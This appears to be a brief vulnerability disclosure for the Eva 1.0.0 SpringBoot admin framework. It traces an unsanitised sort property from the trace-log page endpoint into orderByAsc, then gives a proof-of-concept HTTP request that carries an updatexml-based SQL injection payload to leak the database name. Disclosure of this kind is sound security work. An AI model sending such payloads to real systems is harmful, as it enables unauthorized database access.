### eva sql

project address:

https://github.com/coderd-repos/eva

Version: 1.0.0

Eva is an open source backend management system project framework based on SpringBoot and Mybatis Plus that supports online customized technology stacks and online customized function modules. Like other open source projects, in order to make project development simple enough, Eva has carefully designed and explored, adopted the idea of convention over configuration, and reasonably encapsulated the common functions of the project based on scalability, security, and readability. It is introduced and explained in detail in the document.

src/main/java/com/eva/api/system/SystemTraceLogController.java calls service layer findPage



![img](https://cdn-images-1.medium.com/max/1080/0*IAcGUHbyGl82XEV4)



src/main/java/com/eva/service/system/impl/SystemTraceLogServiceImpl.java findPage finally calls orderByAsc

![img](https://cdn-images-1.medium.com/max/1080/0*QAGmxNNz0amL54h9)

![img](https://cdn-images-1.medium.com/max/1080/0*WbtRXK4qGb0wZlEQ)

poc

```
POST /system/traceLog/page HTTP/1.1
Host: 127.0.0.1:10011
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:eva-auth-token=a5e53594-b9fa-45cc-a721-aa797e776384
Connection: close
Content-Type: application/json
Content-Length: 142

{
  "model": {},
  "page": 0,
  "capacity": 0,
  "sorts":[{"property":"updatexml(1,concat(0x7b,database(),0x7d),1)","direction":"asc"}]
}
```